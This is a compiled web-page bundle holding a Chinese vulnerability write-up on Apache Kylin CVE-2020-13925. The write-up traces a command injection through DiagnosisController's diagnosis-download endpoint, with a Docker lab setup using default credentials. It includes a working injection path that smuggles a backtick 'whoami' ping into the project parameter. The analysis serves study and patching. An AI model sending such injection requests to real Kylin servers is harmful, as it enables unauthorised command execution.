import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as d}from"./app-58e4a7d6.js";const a={},s=d(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>6月，京东安全的蓝军团队发现了一个 apache kylin 远程命令执行严重漏洞（ CVE-2020-13925）。黑客可以利用这个漏洞，登录任何管理员账号和密码默认未修改的账号，获得管理员权限。由于Apache Kylin被广泛应用于企业的大数据分析平台，因此该漏洞将对企业核心数据具有较大的危害，存在数据泄露风险，建议用户尽快升级软件至安全版本。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Kylin 2.3.0 ~ 2.3.2
Apache Kylin 2.4.0 ~ 2.4.1
Apache Kylin 2.5.0 ~ 2.5.2
Apache Kylin 2.6.0 ~ 2.6.5
Apache Kylin 3.0.0-alpha
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker pull apachekylin/apache-kylin-standalone:3.0.1

docker run -d \\
-m 8G \\
-p 7070:7070 \\
-p 8088:8088 \\
-p 50070:50070 \\
-p 8032:8032 \\
-p 8042:8042 \\
-p 16010:16010 \\
apachekylin/apache-kylin-standalone:3.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251605625.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>出现漏洞的代码文件在<code>server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251607872.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/**
     * Get diagnosis information for project
     */
    @RequestMapping(value = &quot;/project/{project}/download&quot;, method = { RequestMethod.GET }, produces = {
            &quot;application/json&quot; })
    @ResponseBody
    public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request,
            final HttpServletResponse response) {
        try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(&quot;diag_project&quot;, &quot;&quot;)) {
            String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile());
            setDownloadResponse(filePath, response);
        } catch (IOException e) {
            throw new InternalErrorException(&quot;Failed to dump project diagnosis info. &quot; + e.getMessage(), e);
        }

    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里可以看到<code> {project}</code>参数是用户可控的变量，向下跟进<code>dumpProjectDiagnosisInfo</code>函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException {
        aclEvaluate.checkProjectOperationPermission(project);
        String[] args = { project, exportPath.getAbsolutePath() };
        runDiagnosisCLI(args);
        return getDiagnosisPackageName(exportPath);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251607641.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>首先通过<code>checkProjectOperationPermission</code>函数来检查该<code>project</code>是否许可，然后构建一个<code>args</code>的字符串数组，看一下<code>checkProjectOperationPermission</code>函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public void checkProjectOperationPermission(String projectName) {
       ProjectInstance projectInstance = getProjectInstance(projectName);
       aclUtil.hasProjectOperationPermission(projectInstance);
   }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里传入<code>projectName</code>，然后通过<code>getProjectInstance</code>来获取项目实例,跟进<code>getProjectInstance</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private ProjectInstance getProjectInstance(String projectName) {
        return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因为 <code>projectName</code> 会被我们替换掉，所以不会获得一个正确的<code>projectName</code>,则会返回一个Null，查看下<code>hasProjectOperationPermission</code>函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN +
            &quot; or hasPermission(#project, &#39;ADMINISTRATION&#39;)&quot; +
            &quot; or hasPermission(#project, &#39;MANAGEMENT&#39;)&quot; +
            &quot; or hasPermission(#project, &#39;OPERATION&#39;)&quot;)
    public boolean hasProjectOperationPermission(ProjectInstance project) {
        return true;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里并没有对<code>projectName</code>进行检验，只对用户身份进行了检验，当为<code>ADMIN、ADMINISTRATION、MANAGEMENT、OPERATION</code>等权限，该值默认返回为<code>true</code>，回到<code> dumpProjectDiagnosisInfo</code>函数，向下继续跟进<code>runDiagnosisCLI</code>函数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251607574.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private void runDiagnosisCLI(String[] args) throws IOException {
        Message msg = MsgPicker.getMsg();

        File cwd = new File(&quot;&quot;);
        logger.debug(&quot;Current path: &quot; + cwd.getAbsolutePath());

        logger.debug(&quot;DiagnosisInfoCLI args: &quot; + Arrays.toString(args));
        File script = new File(KylinConfig.getKylinHome() + File.separator + &quot;bin&quot;, &quot;diag.sh&quot;);
        if (!script.exists()) {
            throw new BadRequestException(
                    String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath()));
        }

        String diagCmd = script.getAbsolutePath() + &quot; &quot; + StringUtils.join(args, &quot; &quot;);
        CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor();
        Pair&lt;Integer, String&gt; cmdOutput = executor.execute(diagCmd);

        if (cmdOutput.getFirst() != 0) {
            throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL());
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意看这几行代码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>String diagCmd = script.getAbsolutePath() + &quot; &quot; + StringUtils.join(args, &quot; &quot;);
        CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor();
        Pair&lt;Integer, String&gt; cmdOutput = executor.execute(diagCmd);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>与 Apache Kylin 命令注入漏洞<code>CVE-2020-1956</code>类似，同样也是经过<code>execute函数</code>，而<code>digCmd</code>同样也是经过了命令拼接</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private Pair&lt;Integer, String&gt; runRemoteCommand(String command, Logger logAppender) throws IOException {
        SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd);

        SSHClientOutput sshOutput;
        try {
            sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender);
            int exitCode = sshOutput.getExitCode();
            String output = sshOutput.getText();
            return Pair.newPair(exitCode, output);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            throw new IOException(e.getMessage(), e);
        }
    }

    private Pair&lt;Integer, String&gt; runNativeCommand(String command, Logger logAppender) throws IOException {
        String[] cmd = new String[3];
        String osName = System.getProperty(&quot;os.name&quot;);
        if (osName.startsWith(&quot;Windows&quot;)) {
            cmd[0] = &quot;cmd.exe&quot;;
            cmd[1] = &quot;/C&quot;;
        } else {
            cmd[0] = &quot;/bin/bash&quot;;
            cmd[1] = &quot;-c&quot;;
        }
        cmd[2] = command;

        ProcessBuilder builder = new ProcessBuilder(cmd);
        builder.redirectErrorStream(true);
        Process proc = builder.start();

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8));
        String line;
        StringBuilder result = new StringBuilder();
        while ((line = reader.readLine()) != null &amp;&amp; !Thread.currentThread().isInterrupted()) {
            result.append(line).append(&#39;\\n&#39;);
            if (logAppender != null) {
                logAppender.log(line);
            }
        }

        if (Thread.interrupted()) {
            logger.info(&quot;CliCommandExecutor is interruppted by other, kill the sub process: &quot; + command);
            proc.destroy();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // do nothing
            }
            return Pair.newPair(1, &quot;Killed&quot;);
        }

        try {
            int exitCode = proc.waitFor();
            return Pair.newPair(exitCode, result.toString());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException(e);
        }
    }

}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样我们就可以通过控制<code> {project}</code> 请求就可以造成命令注入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/kylin/api/diag/project/{project}/download
/kylin/api/diag/project/||ping \`whoami.111.111.111\`||/download
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>拼接后则出现</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里通过报错语句可以回显命令验证漏洞存在</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>throw new InternalErrorException(&quot;Failed to dump project diagnosis info. &quot; + e.getMessage(), e);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251607066.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在修复中，过滤了<code>||</code>,<code>&amp;&amp;</code>等符号，造成无法命令注入</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251608429.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞通报中共两个利用点</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/kylin/api/diag/project/{project}/download  
/kylin/api/diag/job/{jobId}/download
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>查看函数发现利用方式相同，直接利用<code>job</code>会失败，因为 <code>{project}</code>默认有一个<code>learn_kylin</code>，而<code>job</code>没有</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251608689.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,41),r=[s];function t(l,c){return i(),n("div",null,r)}const v=e(a,[["render",t],["__file","Apache Kylin DiagnosisController.java 命令注入漏洞 CVE-2020-13925.html.vue"]]);export{v as default};
